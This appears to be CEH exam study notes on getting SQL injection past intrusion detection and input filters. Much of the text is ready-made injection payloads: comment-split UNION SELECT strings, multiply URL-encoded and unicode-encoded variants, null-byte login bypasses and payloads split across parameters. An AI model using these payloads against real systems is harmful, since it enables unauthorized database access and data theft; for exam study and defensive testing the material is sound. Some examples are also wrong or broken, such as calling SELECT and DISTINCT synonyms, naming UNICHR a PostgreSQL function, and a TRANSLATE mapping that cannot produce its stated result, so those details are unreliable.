# SQL Injection Evasion Techniques

## Evading Intrusion Detection Systems (IDS)

Intrusion Detection Systems monitor network traffic and system activities to detect malicious behavior. SQL injection evasion techniques help bypass these security controls.

### IDS Detection Mechanisms

#### Signature-Based Detection
- Pattern matching against known attack signatures
- Keyword detection (SELECT, UNION, DROP, etc.)
- Character sequence analysis
- Statistical anomaly detection

#### Behavioral Analysis
- Unusual database query patterns
- High-frequency parameter modifications
- Abnormal response time patterns
- Unexpected data access patterns

#### Network Traffic Analysis
- HTTP parameter analysis
- POST body content inspection
- Header field examination
- SSL/TLS encrypted traffic analysis

### IDS Evasion Strategies

#### Traffic Fragmentation
- Split payloads across multiple requests
- Use session state to maintain context
- Implement time delays between requests
- Distribute attack across multiple connections

#### Protocol Manipulation
- HTTP parameter pollution
- Header field manipulation
- Content-encoding variations
- Protocol version exploitation

#### Timing-Based Evasion
- Slow and low attack patterns
- Random delay insertion
- Business hour alignment
- Traffic pattern mimicry

## Types of Signature Evasion Techniques

### Inline Comment Evasion

Using comment syntax to break up recognizable attack patterns while maintaining SQL functionality.

#### MySQL Inline Comments
```sql
-- Basic inline comment evasion
SELECT/**/username/**/FROM/**/users
UN/**/ION/**/SE/**/LECT/**/1,2,3

-- Nested comment evasion
SELECT/*comment1*/username/*comment2*/FROM/*comment3*/users

-- Version-specific comments (MySQL)
SELECT/*!50001 username*/FROM/*!50001 users*/
UN/*!50001 ION*/SE/*!50001 LECT*/1,2,3
```

#### SQL Server Inline Comments
```sql
-- Basic inline comment evasion
SELECT/**/username/**/FROM/**/users
UN/**/ION/**/SE/**/LECT/**/1,2,3

-- Multi-line comment evasion
SELECT/*
multiline
comment*/username/*
another
comment*/FROM/*
final
comment*/users
```

#### PostgreSQL Inline Comments
```sql
-- Standard inline comments
SELECT/**/username/**/FROM/**/users

-- Nested comment combinations
SELECT/*outer/*inner*/comment*/username/**/FROM/**/users
```

#### Oracle Inline Comments
```sql
-- Basic inline comment evasion
SELECT/**/username/**/FROM/**/users

-- Complex comment structures
SELECT/*comment*/username/*another*/FROM/*final*/users
```

### Character Encoding Evasion

Converting attack payloads into different character encodings to bypass signature detection.

#### URL Encoding
```sql
-- Original payload
' UNION SELECT user(),database()--

-- URL encoded
%27%20UNION%20SELECT%20user()%2Cdatabase()%2D%2D

-- Double URL encoding  
%2527%2520UNION%2520SELECT%2520user()%252Cdatabase()%252D%252D

-- Mixed encoding
'%20UNION%20SELECT%20user()%2Cdatabase()--
```

#### Hex Encoding
```sql
-- Original payload
' UNION SELECT 'admin','password'

-- Hex encoded values
' UNION SELECT 0x61646D696E,0x70617373776F7264

-- Mixed hex and string
' UNION SELECT CHAR(97,100,109,105,110),0x70617373776F7264
```

#### Unicode Encoding
```sql
-- Original payload
' UNION SELECT user()--

-- Unicode encoded
\u0027\u0020UNION\u0020SELECT\u0020user()\u002D\u002D

-- UTF-8 encoded
%C0%A7 UNION SELECT user()%C0%AD%C0%AD
```

#### Base64 Encoding (Context-Dependent)
```sql
-- Base64 encoded payload (when supported)
Original: ' UNION SELECT user()--
Base64: JyBVTklPTiBTRUxFQ1QgdXNlcigpLS0=

-- Used in specific contexts like JSON
{"query": "JyBVTklPTiBTRUxFQ1QgdXNlcigpLS0="}
```

### String Concatenation Evasion

Breaking attack strings into multiple parts and concatenating them at runtime.

#### MySQL Concatenation
```sql
-- CONCAT function
CONCAT('UN','ION',' ','SE','LECT')
CONCAT(CHAR(85,78,73,79,78),' ',CHAR(83,69,76,69,67,84))

-- Pipe operator (not standard MySQL)
'UN'||'ION'||' '||'SE'||'LECT'  -- PostgreSQL syntax
```

#### SQL Server Concatenation
```sql
-- Plus operator
'UN'+'ION'+' '+'SE'+'LECT'
CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78)+' '+CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)

-- CONCAT function (SQL Server 2012+)
CONCAT('UN','ION',' ','SE','LECT')
```

#### PostgreSQL Concatenation
```sql
-- Pipe operator
'UN'||'ION'||' '||'SE'||'LECT'
CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)||' '||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)

-- CONCAT function
CONCAT('UN','ION',' ','SE','LECT')
```

#### Oracle Concatenation
```sql
-- Pipe operator
'UN'||'ION'||' '||'SE'||'LECT'
CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)||' '||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)

-- CONCAT function (limited to 2 parameters)
CONCAT(CONCAT('UN','ION'),CONCAT(' SE','LECT'))
```

### Obfuscated Code Techniques

Making malicious code difficult to detect through various obfuscation methods.

#### Function Name Obfuscation
```sql
-- Original functions
SELECT user(), database(), version()

-- Obfuscated equivalents
SELECT USER(), SCHEMA(), @@VERSION  -- MySQL
SELECT user_name(), db_name(), @@version  -- SQL Server
SELECT USER, SYS_CONTEXT('USERENV','DB_NAME'), banner FROM v$version WHERE rownum=1  -- Oracle
```

#### Keyword Variation
```sql
-- Case variation
select * from users
SeLeCt * FrOm UsErS
SELECT * FROM users

-- Keyword synonyms
SELECT vs DISTINCT
WHERE vs HAVING (in specific contexts)
AND vs && (MySQL)
OR vs || (MySQL/PostgreSQL)
```

#### Mathematical Obfuscation
```sql
-- Arithmetic operations
SELECT * FROM users WHERE id=1+0
SELECT * FROM users WHERE id=2-1
SELECT * FROM users WHERE id=1*1
SELECT * FROM users WHERE id=2/2

-- Boolean arithmetic
SELECT * FROM users WHERE id=1 AND 1+1=2
SELECT * FROM users WHERE id=1 AND 0x1=1
SELECT * FROM users WHERE id=1 AND !0
```

### Manipulating White Spaces

Using various whitespace characters and techniques to evade pattern matching.

#### Alternative Whitespace Characters
```sql
-- Tab character (\t)
SELECT\tuser()\tFROM\tusers

-- New line character (\n)
SELECT\nuser()\nFROM\nusers

-- Carriage return (\r)
SELECT\ruser()\rFROM\rusers

-- Form feed (\f)
SELECT\fuser()\fFROM\fusers

-- Vertical tab (\v)
SELECT\vuser()\vFROM\vusers
```

#### Multiple Whitespace Characters
```sql
-- Multiple spaces
SELECT    user()    FROM    users

-- Mixed whitespace
SELECT\t  \n  user()\r\n  FROM\t  users

-- No spaces where possible
SELECT(user())FROM(users)WHERE(1=1)
```

#### Parentheses as Space Alternatives
```sql
-- Function call syntax
SELECT(user())FROM(users)WHERE(id=1)

-- Subquery syntax
SELECT(SELECT(user()))FROM(users)WHERE((1)=(1))

-- Mathematical expressions
SELECT(user())FROM(users)WHERE((1+1)=(2))
```

### Hex Encoding Techniques

Converting strings and characters to hexadecimal representation.

#### String Hex Encoding
```sql
-- MySQL hex strings
SELECT 0x61646D696E  -- 'admin'
SELECT 0x70617373776F7264  -- 'password'

-- Hex function
SELECT HEX('admin')  -- Returns '61646D696E'
SELECT UNHEX('61646D696E')  -- Returns 'admin'
```

#### Character Code Conversion
```sql
-- MySQL CHAR function
SELECT CHAR(97,100,109,105,110)  -- 'admin'
SELECT CHAR(112,97,115,115,119,111,114,100)  -- 'password'

-- SQL Server CHAR function
SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)  -- 'admin'

-- Oracle CHR function
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) FROM dual  -- 'admin'
```

#### ASCII/Unicode Conversion
```sql
-- ASCII values
SELECT ASCII('A')  -- Returns 65
SELECT CHAR(65)    -- Returns 'A'

-- Unicode handling
SELECT NCHAR(65)   -- Returns 'A' (SQL Server)
SELECT UNICHR(65)  -- Returns 'A' (PostgreSQL)
```

### Sophisticated Pattern Matching Evasion

Advanced techniques to bypass intelligent pattern detection systems.

#### Dynamic Query Construction
```sql
-- Variable-based construction
SET @query = CONCAT('SEL','ECT * FROM us','ers');
PREPARE stmt FROM @query;
EXECUTE stmt;

-- Conditional construction
SELECT CASE 
  WHEN 1=1 THEN 'SELECT * FROM users'
  ELSE 'SELECT 1'
END;
```

#### Nested Function Calls
```sql
-- Multiple function layers
SELECT SUBSTRING(REVERSE(REVERSE('SELECT * FROM users')),1,100)

-- Complex mathematical operations
SELECT * FROM users WHERE id=((1*1)+(0*999)+(0/1)+(0%999))
```

#### Template-Based Evasion
```sql
-- Template string construction
SELECT REPLACE('SELxCT * FROM usxrs','x','E')

-- Pattern substitution
SELECT TRANSLATE('ABJJKL * EQGM NAKQA','ABJKLNQKEA','SELECTFROMUS')
```

### URL Encoding Variations

Different URL encoding techniques to bypass detection.

#### Standard URL Encoding
```sql
-- Single encoding
%27 UNION SELECT user()--
%27%20UNION%20SELECT%20user()%2D%2D

-- Double encoding
%2527%2520UNION%2520SELECT%2520user()%252D%252D

-- Triple encoding  
%25252527%25252520UNION%25252520SELECT%25252520user()%2525252D%2525252D
```

#### Unicode URL Encoding
```sql
-- Unicode percent encoding
%u0027%u0020UNION%u0020SELECT%u0020user()%u002D%u002D

-- UTF-8 percent encoding
%C0%A7%C0%A0UNION%C0%A0SELECT%C0%A0user()%C0%AD%C0%AD

-- UTF-16 encoding
%00%27%00%20UNION%00%20SELECT%00%20user()%00-%00-
```

#### Mixed Encoding Techniques
```sql
-- Partial encoding
'%20UNION%20SELECT user()--
%27 UNION SELECT user()%2D%2D

-- Context-specific encoding
' UNION SELECT CHAR(%34%39) -- Mixed approaches
```

### Null Byte Case Variation

Using null bytes and case variations to bypass simple filters.

#### Null Byte Injection
```sql
-- Null byte termination
admin'%00 OR 1=1--

-- Null byte in middle
ad%00min' OR 1=1--

-- Multiple null bytes
%00admin%00' OR 1=1--%00
```

#### Case Variation Strategies
```sql
-- Random case variation
sElEcT * FrOm UsErS
UnIoN sElEcT uSeR(), DaTaBaSe()

-- Alternating case
SeLeCt * fRoM uSeRs
UnIoN sElEcT uSeR(), dAtAbAsE()

-- Mixed with encoding
SEL%45CT * FR%4fM users
UN%49ON SEL%45CT user(), database()
```

### Variable Declaration Evasion

Using database-specific variable declaration to obfuscate attacks.

#### MySQL Variables
```sql
-- User-defined variables
SET @query = 'SELECT * FROM users';
SET @table = 'users';
SET @sql = CONCAT('SELECT * FROM ', @table);

-- System variables
SELECT @@version, @@datadir, @@hostname
```

#### SQL Server Variables
```sql
-- Local variables
DECLARE @query NVARCHAR(100)
SET @query = N'SELECT * FROM users'
EXEC(@query)

-- Dynamic SQL
DECLARE @table NVARCHAR(50) = 'users'
EXEC('SELECT * FROM ' + @table)
```

#### PostgreSQL Variables
```sql
-- Session variables
SET my.custom_var = 'users';
SELECT current_setting('my.custom_var');

-- Dynamic queries
DO $$
BEGIN
  EXECUTE 'SELECT * FROM users';
END $$;
```

### IP Fragmentation Techniques

Network-level evasion through packet fragmentation.

#### TCP Fragmentation
- Split SQL injection payloads across multiple TCP segments
- Use small MTU sizes to force fragmentation
- Implement overlapping fragment attacks
- Utilize out-of-order packet delivery

#### Application-Layer Fragmentation
```sql
-- Split across multiple parameters
param1=') UNION SELECT
param2=user(), database() FROM
param3=dual--

-- Split across multiple requests
Request 1: '; CREATE TEMPORARY TABLE temp_table AS SELECT * FROM users--
Request 2: '; SELECT * FROM temp_table WHERE username LIKE 'admin'--
```

### Advanced Variation Techniques

#### Algorithmic Evasion
```sql
-- Bit manipulation
SELECT * FROM users WHERE id & 1 = 1

-- Mathematical transformations
SELECT * FROM users WHERE id = SQRT(POWER(2,2))

-- String algorithms
SELECT * FROM users WHERE username = REVERSE(REVERSE('admin'))
```

#### Context-Aware Evasion
```sql
-- JSON context
{"query": "SELECT * FROM users WHERE id = 1 UNION SELECT user(),database(),3"}

-- XML context
<query>SELECT * FROM users WHERE id = 1 UNION SELECT user(),database(),3</query>

-- Base64 context (when decoded server-side)
U0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSBpZCA9IDEgVU5JT04gU0VMRUNUIHVzZXIoKSxkYXRhYmFzZSgpLDM=
```

---

## Key CEH v13 Exam Points

### Critical Concepts
1. **IDS Evasion**: Understanding detection mechanisms and bypass strategies
2. **Signature Evasion**: Techniques to avoid pattern-based detection systems
3. **Encoding Methods**: Multiple encoding techniques for payload obfuscation
4. **String Manipulation**: Concatenation and obfuscation methods
5. **Whitespace Manipulation**: Alternative characters and spacing techniques
6. **Advanced Evasion**: Sophisticated techniques for modern security systems
7. **Multi-Vector Approaches**: Combining multiple evasion techniques

### Exam Focus Areas
- **Detection Bypass**: Methods to evade signature-based and behavioral detection
- **Encoding Proficiency**: URL, hex, unicode, and character encoding techniques
- **Database-Specific Techniques**: Engine-specific evasion methods
- **Obfuscation Strategies**: Code and query structure obfuscation
- **Fragmentation Attacks**: Network and application layer payload splitting
- **Pattern Disruption**: Breaking recognizable attack signatures
- **Advanced Persistence**: Maintaining access while avoiding detection

### Practical Skills
- Implement multiple encoding techniques to bypass input filters
- Construct fragmented attacks across multiple requests or parameters
- Use database-specific functions and syntax for advanced evasion
- Combine multiple evasion techniques for maximum effectiveness
- Analyze and bypass different types of security controls
- Adapt evasion techniques based on target environment characteristics
- Understand the trade-offs between stealth and attack effectiveness
